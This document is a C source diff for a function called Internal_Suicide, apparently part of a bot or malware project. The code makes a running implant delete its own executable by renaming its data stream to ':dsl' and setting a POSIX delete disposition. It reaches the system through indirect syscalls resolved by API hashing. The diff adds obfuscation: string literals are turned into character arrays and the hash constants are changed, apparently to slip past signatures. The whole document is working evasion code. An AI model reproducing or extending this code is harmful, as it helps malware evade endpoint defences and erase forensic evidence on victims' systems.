@@ -16,7 +16,9 @@ void Internal_Suicide(const wchar_t* botPath) {
     SYSCALL_GATE gate;
     
     //convert DOS Path to NT Path
-    wchar_t ntPath[MAX_PATH + 6] = L"\\??\\";
+    wchar_t ntPrefix[] = {'\\','?','?','\\','\0'};
+    wchar_t ntPath[MAX_PATH + 6];
+    wcscpy_s(ntPath, MAX_PATH + 6, ntPrefix);
     wcscat_s(ntPath, MAX_PATH + 6, botPath);
 
 
@@ -26,7 +28,7 @@ void Internal_Suicide(const wchar_t* botPath) {
     //Stage 1: Rename stream
     
     //NtOpenFile (DELETE | SYNCHRONIZE rights)
-    gate = GetSSNByHash(0X441098F16BE8639); 
+    gate = GetSSNByHash(0xA9E5F0C58370BF96); 
     if (gate.wServiceId != 0) {
         PREPARE_SYSCALL(gate); 
         status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)(0x00010000L | 0x00100000L), (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)1, (ULONG_PTR)0x00000020, 0, 0, 0, 0, 0); 
@@ -36,7 +38,7 @@ void Internal_Suicide(const wchar_t* botPath) {
         BYTE renameBuffer[256] = {0}; 
         PFILE_RENAME_INFORMATION pRename = (PFILE_RENAME_INFORMATION)renameBuffer;
         
-        const wchar_t* streamName = L":dsl";
+        wchar_t streamName[] = {':','d','s','l','\0'};
         SIZE_T streamLen = wcslen(streamName) * sizeof(wchar_t);
         
         pRename->ReplaceIfExists = TRUE;
@@ -48,14 +50,14 @@ void Internal_Suicide(const wchar_t* botPath) {
         SIZE_T renameStructSize = sizeof(FILE_RENAME_INFORMATION) + streamLen;
 
         //NtSetInformationFile (FileRenameInformation)
-        gate = GetSSNByHash(0XF74FD0B30EFD1299); 
+        gate = GetSSNByHash(0X9A2D59E5F3A964D1); 
         if (gate.wServiceId != 0) {
             PREPARE_SYSCALL(gate);
             IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)&ioStatus, (ULONG_PTR)pRename, (ULONG_PTR)renameStructSize, (ULONG_PTR)10, 0, 0, 0, 0, 0, 0);
         }
 
         //NtClose
-        gate = GetSSNByHash(0X4F3163BAF74EFD5D); 
+        gate = GetSSNByHash(0X5E575BD8ACC77BC0); 
         if (gate.wServiceId != 0) {
             PREPARE_SYSCALL(gate);
             IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
@@ -66,7 +68,7 @@ void Internal_Suicide(const wchar_t* botPath) {
     
     
     //NtOpenFile
-    gate = GetSSNByHash(0X441098F16BE8639); 
+    gate = GetSSNByHash(0xA9E5F0C58370BF96); 
     if (gate.wServiceId != 0) {
         PREPARE_SYSCALL(gate);
         status = IndirectSyscall((ULONG_PTR)&hFile, (ULONG_PTR)(0x00010000L | 0x00100000L), (ULONG_PTR)&objAttr, (ULONG_PTR)&ioStatus, (ULONG_PTR)1, (ULONG_PTR)0x00000020, 0, 0, 0, 0, 0); 
@@ -77,14 +79,14 @@ void Internal_Suicide(const wchar_t* botPath) {
         fDeleteEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;
 
         // NtSetInformationFile (FileDispositionInformationEx)
-        gate = GetSSNByHash(0XF74FD0B30EFD1299); 
+        gate = GetSSNByHash(0X9A2D59E5F3A964D1); 
         if (gate.wServiceId != 0) {
             PREPARE_SYSCALL(gate);
             IndirectSyscall((ULONG_PTR)hFile, (ULONG_PTR)&ioStatus, (ULONG_PTR)&fDeleteEx, (ULONG_PTR)sizeof(fDeleteEx), (ULONG_PTR)64, 0, 0, 0, 0, 0, 0); 
         }
 
         // NtClose
-        gate = GetSSNByHash(0X4F3163BAF74EFD5D); 
+        gate = GetSSNByHash(0X5E575BD8ACC77BC0); 
         if (gate.wServiceId != 0) {
             PREPARE_SYSCALL(gate);
             IndirectSyscall((ULONG_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
